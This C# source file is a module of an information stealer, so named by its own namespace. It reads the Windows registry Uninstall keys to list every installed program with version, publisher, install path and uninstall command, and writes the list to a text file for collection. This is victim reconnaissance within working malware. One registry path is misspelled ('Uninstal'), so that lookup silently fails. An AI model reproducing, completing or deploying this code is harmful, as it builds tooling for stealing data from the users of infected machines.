using System.Collections.Generic;
using Microsoft.Win32;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Sys;

internal class InstalledPrograms
{
	private class InstalledProgram
	{
		public string Name { get; set; }

		public string Version { get; set; }

		public string InstallDate { get; set; }

		public string Publisher { get; set; }

		public string InstallLocation { get; set; }

		public string UninstallCommand { get; set; }

		public override string ToString()
		{
			return Name + "\t" + Version + "\t" + InstallDate + "\t" + Publisher + "\t" + InstallLocation + "\t" + UninstallCommand;
		}
	}

	public static void Start()
	{
		List<string> list = new List<string>();
		string uninstallKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
		string uninstallKey2 = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstal";
		list.Add("Name\tVersion\tInstallDate\tPublisher\tInstallLocation\tUninstallCommand");
		foreach (InstalledProgram installedProgram in GetInstalledPrograms(uninstallKey, Registry.LocalMachine))
		{
			list.Add(installedProgram.ToString());
		}
		foreach (InstalledProgram installedProgram2 in GetInstalledPrograms(uninstallKey2, Registry.LocalMachine))
		{
			list.Add(installedProgram2.ToString());
		}
		foreach (InstalledProgram installedProgram3 in GetInstalledPrograms(uninstallKey, Registry.CurrentUser))
		{
			list.Add(installedProgram3.ToString());
		}
		foreach (InstalledProgram installedProgram4 in GetInstalledPrograms(uninstallKey2, Registry.CurrentUser))
		{
			list.Add(installedProgram4.ToString());
		}
		DynamicFiles.WriteAllText("InstalledProgram.txt", string.Join("\n", (IEnumerable<string?>)list.ToArray()));
	}

	private static List<InstalledProgram> GetInstalledPrograms(string uninstallKey, RegistryKey key)
	{
		List<InstalledProgram> list = new List<InstalledProgram>();
		key = key.OpenSubKey(uninstallKey);
		if (key != null)
		{
			string[] subKeyNames = key.GetSubKeyNames();
			foreach (string name in subKeyNames)
			{
				using RegistryKey registryKey = key.OpenSubKey(name);
				if (registryKey != null)
				{
					object value = registryKey.GetValue("DisplayName");
					object value2 = registryKey.GetValue("DisplayVersion");
					object value3 = registryKey.GetValue("InstallDate");
					object value4 = registryKey.GetValue("Publisher");
					object value5 = registryKey.GetValue("InstallLocation");
					object value6 = registryKey.GetValue("UninstallString");
					if (value != null)
					{
						InstalledProgram installedProgram = new InstalledProgram();
						installedProgram.Name = value.ToString();
						installedProgram.Version = ((value2 != null) ? value2.ToString() : "");
						installedProgram.InstallDate = ((value3 != null) ? value3.ToString() : "");
						installedProgram.Publisher = ((value4 != null) ? value4.ToString() : "");
						installedProgram.InstallLocation = ((value5 != null) ? value5.ToString() : "");
						installedProgram.UninstallCommand = ((value6 != null) ? value6.ToString() : "");
						list.Add(installedProgram);
						Counter.CountPrograms++;
					}
				}
			}
		}
		return list;
	}
}
